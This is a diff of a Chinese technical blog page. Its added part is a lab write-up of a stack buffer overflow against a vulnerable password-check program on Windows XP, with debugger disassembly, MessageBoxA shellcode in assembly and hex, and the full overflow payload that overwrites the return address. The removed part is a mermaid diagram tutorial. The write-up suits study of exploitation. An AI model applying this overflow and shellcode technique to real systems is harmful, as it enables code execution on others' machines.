+<p>首先要调试verify_password观察栈帧分布,项目根目录下新建password.txt,随便输入些字符,然后在main上下断点,开始调试</p>
+<h3 id="调试观察栈帧分布"><a href="#调试观察栈帧分布" class="headerlink" title="调试观察栈帧分布"></a>调试观察栈帧分布</h3><h4 id="authenticated"><a href="#authenticated" class="headerlink" title="authenticated"></a>authenticated</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">12:       authenticated = strcmp(password, PASSWORD);</span><br><span class="line">00401038   push        offset string &quot;1234567&quot; (0042601c)</span><br><span class="line">0040103D   mov         eax,dword ptr [ebp+8]</span><br><span class="line">00401040   push        eax</span><br><span class="line">00401041   call        strcmp (00401290)</span><br><span class="line">00401046   add         esp,8</span><br><span class="line">00401049   mov         dword ptr [ebp-4],eax</span><br></pre></td></tr></table></figure>
+
+<p>ebp+8指向参数password</p>
+<p>ebp-4是authenticated的地址</p>
+<h4 id="buffer"><a href="#buffer" class="headerlink" title="buffer"></a>buffer</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">13:       strcpy(buffer, password); // over flowed here!</span><br><span class="line">0040104C   mov         ecx,dword ptr [ebp+8]</span><br><span class="line">0040104F   push        ecx</span><br><span class="line">00401050   lea         edx,[ebp-30h]</span><br><span class="line">00401053   push        edx</span><br><span class="line">00401054   call        strcpy (004011a0)</span><br><span class="line">00401059   add         esp,8</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>ebp-30h是buffer的基地址</p>
+<p>30h&#x3D;48,即buffer是紧接着authenticated的</p>
+<p>观察寄存器视图,ebp&#x3D;0x0012FB20</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917003031600.png" alt="image-20220917003031600"></p>
+<p>那么”返回地址”在栈中的地址0x12FB24,buffer的基地址0x12FAF0</p>
+<p>那么往buffer写44+4+4&#x3D;52个字符,这52个字符里就包括了shellcode,就到返回地址的家门口了,然后将0x19FF04即buffer基地址写到返回地址上,如此函数返回时,控制将转移到0x12FAF0,</p>
+<p>由于strcpy函数执行后,不会再有其他行为改变buffer缓冲区,然后函数返回之前退栈只是抬高esp,buffer成为非法区域,但是其内容不会被扬了,然后返回地址退栈交给eip,指向执行shellcode并执行</p>
+<p>下面的任务就是如何编写shellcode</p>
+<h3 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h3><p>首先需要找到MessageBox函数的地址</p>
+<p>windows为了减少基址重定位的开销,给每个系统动态库都分配了各自的基地址,保证他们相互不冲突.</p>
+<p>但是在不同的操作系统上,系统dll的基地址也是不一样的</p>
+<p>在windows xp professional系统上,user32.dll的映像基址是77D10000h</p>
+<blockquote>
+<p>而书上写的是windows xp SP3系统中user32.dll的映像基址是77D40000h</p>
+<p>程序员的自我修养上写的是7E410000h</p>
+</blockquote>
+<p>然后用VC++自带的DEPENDS.EXE程序观察user32.dll中MessageBoxA函数的偏移量</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916231943081.png" alt="Microsoft Visual Studio\Common\Tools\DEPENDS.TXT"></p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916230413042.png" alt="序号477,最有可能的下标476,函数名MessageBoxA,入口点(相对偏移)0x2ADD7"></p>
+<p>VA&#x3D;RVA+ImageBase&#x3D;0x2ADD7+0x77D10000&#x3D;0x77D3ADD7</p>
+<p>这就找到了MessageBoxA函数的虚拟地址</p>
+<p>shellcode是这样写的:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push 0x74736577</span><br><span class="line">push 0x6c696166</span><br><span class="line">mov eax,esp</span><br><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">mov eax,0x77D3ADD7;MessageBoxA地址压栈</span><br><span class="line">call eax</span><br></pre></td></tr></table></figure>
+
+<p>编译成机器码为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33DB536877657374686661696C8BC453505053B8D7ADD377FFD0</span><br></pre></td></tr></table></figure>
+
+<p>这是26个字节了,用0x90(啥也不干nop)再填充26个字节到返回地址的家门口,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br></pre></td></tr></table></figure>
+
+<p>然后四个字节用buffer的基地址0x0019FF04,溢出返回地址,只写低3字节就可以,高一个字节’\0’自动填上了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F0 FA 12</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">33 DB 53 68 77 65 73 74 68 66 61 69 6C 8B C4 53</span><br><span class="line">50 50 53 B8 D7 AD D3 77 FF D0 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 F0 FA 12</span><br></pre></td></tr></table></figure>
+
+<p>用010editor写到password.txt中然后保存</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917003356045.png" alt="image-20220917003356045"></p>
+<p>在windows XP虚拟机上执行成功</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917003507819.png" alt="image-20220917003507819"></p>
+<p>在windows 11上白搭,一是没找到32位的user32.dll,二是ebp值和windows XP上不同</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>在windows XP上调试本程序</p>
+<p>在strcpy执行之后从0x12FAF0开始的44+4+4+4个字节都被溢出修改</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917004128116.png" alt="image-20220917004128116"></p>
+<p>retn返回之后,控制已经到达了0x0012FAF0处,开始执行shellcode</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917004302943.png" alt="image-20220917004302943"></p>
+<p>此时堆栈顶ESP指向0x12FB28,这是main函数call verify_password之前的栈顶位置,</p>
+<p>堆栈从大到小生长的话,0x0012FAF0是在其生长道路上的,shellcode有没有被再次生长的堆栈覆盖的可能呢?</p>
+<p>shellcode中有7个压栈,也就是28&#x3D;0x1A个字节,0x12FB28-0x1A&#x3D;0x12FB0E&gt;0x12FAF0,不会覆盖shellcode,可以放心执行</p>
+<p>当MessageBoxA函数返回时,下面就没有有意义的指令了,迟早要寄掉</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917005330244.png" alt="image-20220917005330244"></p>
+<p>在0x12fb0a处就寄了,错误代码0xc0000005</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/16/%E5%85%B3%E7%B3%BB%E4%BB%A3%E6%95%B0%E5%92%8CSQL%E8%AF%AD%E8%A8%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3975,332 +4276,6 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:7&gt; s</span><br><span class="line">Next at t=17179024</span><br><span class="line">(0) [0x000000007c76] 0000:0000000000007c76 (unk. ctxt): jmpf 0x0008:0000007e      ; 66ea7e0000000800</span><br><span class="line">&lt;bochs:8&gt; creg</span><br><span class="line">CR0=0x60000011: pg CD NW ac wp ne ET ts em mp PE</span><br></pre></td></tr></table></figure>
 
 <p>果然PE&#x3D;1了,表明处理器工作在保护状态</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/08/29/mermaid/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
-      <meta itemprop="name" content="dustball">
-      <meta itemprop="description" content="dustland">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dustland">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/08/29/mermaid/" class="post-title-link" itemprop="url">mermaid</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-08-29 00:00:00 / Modified: 10:39:40" itemprop="dateCreated datePublished" datetime="2022-08-29T00:00:00+08:00">2022-08-29</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="mermaid制图"><a href="#mermaid制图" class="headerlink" title="mermaid制图"></a>mermaid制图</h1><h2 id="mermaid-in-typora"><a href="#mermaid-in-typora" class="headerlink" title="mermaid in typora"></a>mermaid in typora</h2><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220621095136061.png" alt="image-20220621095136061"></p>
-<p>在代码块的代码类型处声明为<code>mermaid</code>就可以使用<code>mermaid</code>制图了</p>
-<p><strong>代码块首行</strong><code>classDiagram</code>表明本代码块要绘制一个类图</p>
-<blockquote>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220621105215969.png" alt="image-20220621105215969"></p>
-</blockquote>
-<h2 id="journey"><a href="#journey" class="headerlink" title="journey"></a>journey</h2><p>旅程图(或者说游记图,随便爱咋咋叫)</p>
-<p>源代码:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">journey		#首行表明本图类型为游记</span><br><span class="line">    title 摆烂周记	#标题,整个图表只能有一个title,最终显示的时候以最后出现的title为准</span><br><span class="line">    section <span class="number">6.15</span><span class="number">-6.17</span>		<span class="meta">#section声明了一个章节,在下一个section之前的部分为该章节的组成</span></span><br><span class="line">    	上午摆烂 :<span class="number">5</span>		#章节组成用 事情:心情指数	表示,中间的冒号是解析器的判断标志.	心情从<span class="number">0</span>到<span class="number">6</span>(实际上范围更大)</span><br><span class="line">    下午摆烂 :<span class="number">6</span>		#缩进不会影响显示,但是规范起见还是缩进对齐		</span><br><span class="line">	section <span class="number">6.18</span></span><br><span class="line">    	上午摆烂 :<span class="number">4</span></span><br><span class="line">    	下午摆烂 :<span class="number">4</span></span><br><span class="line">    	事情貌似不太对劲 :<span class="number">3</span>		#一个章节下面可以有任意个部分</span><br><span class="line">        晚上继续摆烂 :<span class="number">5</span></span><br><span class="line">	section <span class="number">6.19</span></span><br><span class="line">        上午摆烂 :<span class="number">4</span></span><br><span class="line">    	下午摆烂 :<span class="number">5</span></span><br><span class="line">    section <span class="number">6.20</span></span><br><span class="line">        复习毛概 :<span class="number">1</span></span><br><span class="line">    	考毛概	:<span class="number">0</span></span><br><span class="line">    section <span class="number">6.21</span></span><br><span class="line">    	复习软概 :<span class="number">1</span></span><br><span class="line">    	背软概 :<span class="number">0</span></span><br><span class="line">     </span><br></pre></td></tr></table></figure>
-
-<p>效果图:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">journey		#首行表明本图类型为游记</span><br><span class="line">    title 摆烂周记	#标题,整个图表只能有一个title,最终显示的时候以最后出现的title为准</span><br><span class="line">    section 6.15-6.17		#section声明了一个章节,在下一个section之前的部分为该章节的组成</span><br><span class="line">    	上午摆烂 :5		#章节组成用 事情:心情指数	表示,中间的冒号是解析器的判断标志.	心情从0到6(实际上范围更大)</span><br><span class="line">    下午摆烂 :6		#缩进不会影响显示,但是规范起见还是缩进对齐		</span><br><span class="line">	section 6.18</span><br><span class="line">    	上午摆烂 :4</span><br><span class="line">    	下午摆烂 :4</span><br><span class="line">    	事情貌似不太对劲 :3		#一个章节下面可以有任意个部分</span><br><span class="line">        晚上继续摆烂 :5</span><br><span class="line">	section 6.19</span><br><span class="line">        上午摆烂 :4</span><br><span class="line">    	下午摆烂 :5</span><br><span class="line">    section 6.20</span><br><span class="line">        复习毛概 :1</span><br><span class="line">    	考毛概	:0</span><br><span class="line">    section 6.21</span><br><span class="line">    	复习软概 :1</span><br><span class="line">    	背软概 :0</span><br><span class="line">     </span><br></pre></td></tr></table></figure>
-
-<h2 id="flowchart"><a href="#flowchart" class="headerlink" title="flowchart"></a>flowchart</h2><p>流程图</p>
-<h3 id="定义节点"><a href="#定义节点" class="headerlink" title="定义节点"></a>定义节点</h3><p>定义节点的格式:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">节点句柄&lt;节点内容&gt; %%尖括号表示节点类型</span><br></pre></td></tr></table></figure>
-
-<p>节点句柄纯粹是为了下一次使用该节点的时候方便索引同一个节点,</p>
-<p>节点类型有多种,比如</p>
-<p>方形(缺省值,即只写节点句柄时默认使用的形状),圆角,菱形,平行四边形等等</p>
-<blockquote>
-<p>只写句柄的节点又叫做一次性节点,因为这时句柄还起节点内容的作用,不方便被再次索引</p>
-</blockquote>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR;</span><br><span class="line">	A(圆角节点) </span><br><span class="line">	B[方形节点]</span><br><span class="line">	C([跑道节点])</span><br><span class="line">    D[[子程序节点]]</span><br><span class="line">	E[(数据库节点)]</span><br><span class="line">	F((圆圆圈圈))</span><br><span class="line">    G&gt;旗帜节点]</span><br><span class="line">    H&#123;菱形判断框&#125;</span><br><span class="line">    I&#123;&#123;六边形节点&#125;&#125;</span><br><span class="line">    J[/平行四边形节点/]</span><br><span class="line">	K[\反平行四边形节点\]</span><br><span class="line">    L[/体形节点\]</span><br><span class="line">    M[\倒梯形节点/]</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flowchart TB</span><br><span class="line">	A(圆角节点) </span><br><span class="line">	B[方形节点]</span><br><span class="line">	C([跑道节点])</span><br><span class="line">    D[[子程序节点]]</span><br><span class="line">	E[(数据库节点)]</span><br><span class="line">	F((圆圆圈圈))</span><br><span class="line">    G&gt;旗帜节点]</span><br><span class="line">    H&#123;菱形判断框&#125;</span><br><span class="line">    I&#123;&#123;六边形节点&#125;&#125;</span><br><span class="line">    J[/平行四边形节点/]</span><br><span class="line">	K[\反平行四边形节点\]</span><br><span class="line">    L[/体形节点\]</span><br><span class="line">    M[\倒梯形节点/]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="节点关系"><a href="#节点关系" class="headerlink" title="节点关系"></a>节点关系</h3><blockquote>
-<p>类比CS Academy</p>
-<p>学图论时,用过<a target="_blank" rel="noopener" href="https://csacademy.com/app/graph_editor/">CS Academy</a></p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220621195316039.png" alt="image-20220621195316039"></p>
-<p>规范的写法是在Node Count这一行给出节点数量n</p>
-<p>然后接着在Graph Data的前n行分别给出每个节点的句柄</p>
-<p>然后接下来的任意多行给出这几个节点的关系,</p>
-<p>比如<code>1 2</code>就是在1和2节点之间连一条边,如果是directed有向图则方向从左向右,即<code>1-&gt;2</code></p>
-<p>如果边有边权,则按照<code>A B dist</code>这种格式输入给定</p>
-</blockquote>
-<p>在mermaid中,使用方法和CS Academy类似</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flowchart </span><br><span class="line">	<span class="title function_">A</span><span class="params">((<span class="number">0</span>))</span>%%首先声明一下节点句柄,类型,内容</span><br><span class="line">	<span class="title function_">B</span><span class="params">((<span class="number">1</span>))</span></span><br><span class="line">	<span class="title function_">C</span><span class="params">((<span class="number">2</span>))</span></span><br><span class="line">	<span class="title function_">D</span><span class="params">((<span class="number">3</span>))</span></span><br><span class="line">	<span class="title function_">E</span><span class="params">((<span class="number">4</span>))</span></span><br><span class="line">	<span class="title function_">F</span><span class="params">((<span class="number">5</span>))</span></span><br><span class="line">	A--10--&gt;C%%带有权值的有向边类型</span><br><span class="line">	A--5--&gt;E</span><br><span class="line">	B--11--&gt;C</span><br><span class="line">	C--18--&gt;E</span><br><span class="line">	F--20--&gt;A</span><br><span class="line">	D--15--&gt;F</span><br><span class="line">	A--5---&gt;F</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flowchart</span><br><span class="line">	A((0))</span><br><span class="line">	B((1))</span><br><span class="line">	C((2))</span><br><span class="line">	D((3))</span><br><span class="line">	E((4))</span><br><span class="line">	F((5))</span><br><span class="line">	A--10--&gt;C</span><br><span class="line">	A--5--&gt;E</span><br><span class="line">	B--11--&gt;C</span><br><span class="line">	C--18--&gt;E</span><br><span class="line">	F--20--&gt;A</span><br><span class="line">	D--15--&gt;F</span><br><span class="line">	A--5---&gt;F</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
-
-<p>边的长度和类型也是可以改变的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR		</span><br><span class="line">	I---J	%%中间的横杠越多,线越长,如果两个点之间有多条连线,此时多加横杠有可能不起作用</span><br><span class="line">	I--&gt;J</span><br><span class="line">	I--文本--&gt;J</span><br><span class="line">	I-.-&gt;J</span><br><span class="line">	I-.文本.-&gt;J</span><br><span class="line">	I ==粗线===J</span><br><span class="line">	I ==粗箭头线==&gt;J</span><br><span class="line">	<span class="number">1</span> &amp; <span class="number">2</span> &amp; <span class="number">3</span>--&gt; <span class="number">4</span> &amp; <span class="number">5</span></span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR		</span><br><span class="line">	I---J</span><br><span class="line">	I--&gt;J</span><br><span class="line">	I--文本--&gt;J</span><br><span class="line">	I-.-&gt;J</span><br><span class="line">	I-.文本.-&gt;J</span><br><span class="line">	I ==粗线===J</span><br><span class="line">	I ==粗箭头线==&gt;J</span><br><span class="line">	1 &amp; 2 &amp; 3--&gt; 4 &amp; 5</span><br></pre></td></tr></table></figure>
-
-<p>箭头也有多种类型</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">    <span class="title function_">A</span><span class="params">((<span class="number">1</span>))</span></span><br><span class="line"> 	<span class="title function_">B</span><span class="params">((<span class="number">2</span>))</span></span><br><span class="line">    A ----o B	%%圈结尾</span><br><span class="line">    A ----x B	%%x结尾</span><br><span class="line">    A &lt;---&gt; B	%%双向箭头</span><br><span class="line">    A ----&gt; B	%%单项箭头</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">    A((1))</span><br><span class="line"> 	B((2))</span><br><span class="line">    A ----o B	%%圈结尾</span><br><span class="line">    A ----x B	%%x结尾</span><br><span class="line">    A &lt;---&gt; B	%%双向箭头</span><br><span class="line">    A ----&gt; B	%%单项箭头</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-<h3 id="子图"><a href="#子图" class="headerlink" title="子图"></a>子图</h3><p>声明子图用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subgraph	&lt;子图句柄&gt; &lt;[子图名]&gt;</span><br><span class="line">	...#中间的内容为子图</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">flowchart</span><br><span class="line">	<span class="title function_">A</span><span class="params">((<span class="number">0</span>))</span></span><br><span class="line">	<span class="title function_">B</span><span class="params">((<span class="number">1</span>))</span></span><br><span class="line">	</span><br><span class="line">	subgraph sub1 [点子图]</span><br><span class="line">		<span class="title function_">C</span><span class="params">((<span class="number">2</span>))</span></span><br><span class="line">		<span class="title function_">D</span><span class="params">((<span class="number">3</span>))</span></span><br><span class="line">	end</span><br><span class="line">	</span><br><span class="line">	<span class="title function_">E</span><span class="params">((<span class="number">4</span>))</span></span><br><span class="line">	<span class="title function_">F</span><span class="params">((<span class="number">5</span>))</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	A--10--&gt;C</span><br><span class="line">	</span><br><span class="line">	subgraph sub2 [边子图]</span><br><span class="line"></span><br><span class="line">		A--5--&gt;E</span><br><span class="line">	end</span><br><span class="line">	</span><br><span class="line">	B--11--&gt;C</span><br><span class="line">	C--18--&gt;E</span><br><span class="line">	F--20--&gt;A</span><br><span class="line">	D--15--&gt;F</span><br><span class="line">	A--5---&gt;F</span><br><span class="line">	</span><br><span class="line">	G---&gt;sub1		%%点指向子图</span><br><span class="line">	sub1--&gt;sub2		%%子图之间互相指</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">flowchart</span><br><span class="line"></span><br><span class="line">	A((0))</span><br><span class="line">	B((1))</span><br><span class="line">	</span><br><span class="line">	subgraph sub1 [点子图]</span><br><span class="line">		C((2))</span><br><span class="line">		D((3))</span><br><span class="line">	end</span><br><span class="line">	</span><br><span class="line">	E((4))</span><br><span class="line">	F((5))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	A--10--&gt;C</span><br><span class="line">	</span><br><span class="line">	subgraph sub2 [边子图]</span><br><span class="line"></span><br><span class="line">		A--5--&gt;E</span><br><span class="line">	end</span><br><span class="line">	</span><br><span class="line">	B--11--&gt;C</span><br><span class="line">	C--18--&gt;E</span><br><span class="line">	F--20--&gt;A</span><br><span class="line">	D--15--&gt;F</span><br><span class="line">	A--5---&gt;F</span><br><span class="line">	</span><br><span class="line">	G---&gt;sub1		%%点指向子图</span><br><span class="line">	sub1--&gt;sub2		%%子图之间互相指</span><br></pre></td></tr></table></figure>
-
-<p>子图也可以嵌套子图</p>
-<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flowchart</span><br><span class="line">	A %%声明三个节点</span><br><span class="line">	B</span><br><span class="line">	G</span><br><span class="line">	click B <span class="string">&quot;https://www.baidu.com/&quot;</span> <span class="string">&quot;linkage to baidu&quot;</span> %%给B节点上一个到百度的链接,点击跳转</span><br><span class="line">	click G <span class="string">&quot;http://www.github.com&quot;</span> <span class="string">&quot;linkage to github&quot;</span>	%%给G上一个到github的链接</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flowchart </span><br><span class="line">	A </span><br><span class="line">	B</span><br><span class="line">	G</span><br><span class="line">	click B &quot;https://www.baidu.com/&quot; &quot;linkage to baidu&quot;</span><br><span class="line">	click G &quot;http://www.github.com&quot; &quot;linkage to github&quot;</span><br></pre></td></tr></table></figure>
-
-<h3 id="节点样式"><a href="#节点样式" class="headerlink" title="节点样式"></a>节点样式</h3><h4 id="css样式"><a href="#css样式" class="headerlink" title="css样式"></a>css样式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">style &lt;节点句柄&gt; 键1:值1,键2:值2...</span><br></pre></td></tr></table></figure>
-
-
-
